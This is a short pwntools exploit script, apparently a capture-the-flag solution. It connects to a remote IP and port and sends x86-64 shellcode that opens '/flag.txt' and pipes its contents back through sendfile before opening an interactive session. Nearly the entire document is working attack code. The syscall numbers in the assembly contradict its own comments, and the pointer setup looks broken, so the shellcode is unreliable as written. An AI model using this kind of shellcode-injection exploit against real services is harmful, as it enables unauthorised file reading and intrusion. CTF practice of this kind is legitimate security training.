from pwn import *

#context.binary = elf = ELF("./chall")

p = remote("138.68.176.115", 32076)

#p.recvuntil(b'Input your code here:')

shellcode = asm(
    """
    /* push b'/flag.txt\x00' */
    push 0x74
    lea rax, [rip + offset filename]
    push rax
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push 5 /* 2 */
    pop rax
    movq rdi, rsp
    xor esi, esi /* O_RDONLY */
    syscall
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 187 /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall
    filename:
    db '/flag.txt', 0
    """
)
p.sendline(shellcode)

p.interactive()
